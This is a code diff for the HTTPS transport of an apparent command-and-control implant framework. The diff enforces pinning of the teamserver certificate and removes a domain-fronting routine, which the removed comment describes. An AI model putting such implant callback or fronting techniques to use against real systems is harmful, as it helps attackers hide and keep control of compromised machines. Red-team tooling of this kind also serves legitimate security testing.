@@ -10,7 +10,7 @@ import (
 	"net/url"
 	"time"
 
-	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
+	pb "github.com/KKingZero/ARK/pkg/pb"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -22,6 +22,9 @@ type HTTPSTransport struct {
 }
 
 func NewHTTPSTransport(baseURL string, caCertPEM string, cdnDomain string) (*HTTPSTransport, error) {
+	if cdnDomain != "" {
+		return nil, fmt.Errorf("Go HTTPS transport does not support cdnDomain with strict CA pinning; use language=c or omit cdnDomain")
+	}
 	// Fail closed: HTTPS implants must pin the teamserver CA. Builds without an embedded
 	// CA used to set InsecureSkipVerify and were MITM-able on any TLS endpoint.
 	if caCertPEM == "" {
@@ -36,13 +39,11 @@ func NewHTTPSTransport(baseURL string, caCertPEM string, cdnDomain string) (*HTT
 		InsecureSkipVerify: false,
 	}
 
-	// Domain fronting: SNI = CDN domain; Host header = real origin (callback host).
+	// Host override is intentionally disabled for Go HTTPS because strict hostname
+	// verification must match the pinned teamserver certificate.
 	originHost := ""
 	if u, err := url.Parse(baseURL); err == nil {
 		originHost = u.Host
-	}
-	if cdnDomain != "" {
-		tlsConfig.ServerName = cdnDomain
 	}
 
 	return &HTTPSTransport{
